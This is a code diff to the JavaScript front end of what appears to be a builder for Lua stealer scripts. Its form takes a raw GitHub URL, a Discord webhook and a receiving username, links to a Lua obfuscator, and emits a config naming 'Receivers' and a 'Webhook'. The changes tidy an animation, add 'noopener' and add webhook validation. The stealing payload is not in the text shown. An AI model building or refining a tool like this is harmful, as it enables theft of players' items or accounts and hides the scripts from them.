@@ -20,16 +20,17 @@ tutorialBtn.addEventListener("click", () => {
 
 // Back button fades out tutorial and shows form again
 backBtn.addEventListener("click", () => {
-  tutorialPage.animate([{opacity: 1}, {opacity: 0}], {duration: 500, fill: 'forwards'})
-    .onfinish = () => {
-      tutorialPage.classList.add("hidden");
-      scriptForm.style.display = "flex";
-    };
+  const fadeOut = tutorialPage.animate([{opacity: 1}, {opacity: 0}], {duration: 500, fill: 'forwards'});
+  fadeOut.onfinish = () => {
+    tutorialPage.classList.add("hidden");
+    tutorialPage.style.opacity = 1;  // Reset opacity
+    scriptForm.style.display = "flex";
+  };
 });
 
 // Open obfuscation playground in new tab
 obfuscationBtn.addEventListener("click", () => {
-  window.open("https://luaobfuscator.com/?", "_blank");
+  window.open("https://luaobfuscator.com/?", "_blank", "noopener");
 });
 
 // Handle form submission
@@ -40,13 +41,16 @@ scriptForm.addEventListener("submit", (e) => {
   const github = document.getElementById("github").value.trim();
   const webhook = document.getElementById("webhook").value.trim();
 
-  // Basic validation for raw GitHub URL
   if (!github.startsWith("https://raw.githubusercontent.com/")) {
     alert("Please enter a valid Raw GitHub URL.");
     return;
   }
 
-  // Create the Lua script dynamically
+  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
+    alert("Please enter a valid Discord webhook URL.");
+    return;
+  }
+
   const luaScript = `Config = {
   Receivers = {"${username}"},
   Webhook = "${webhook}",
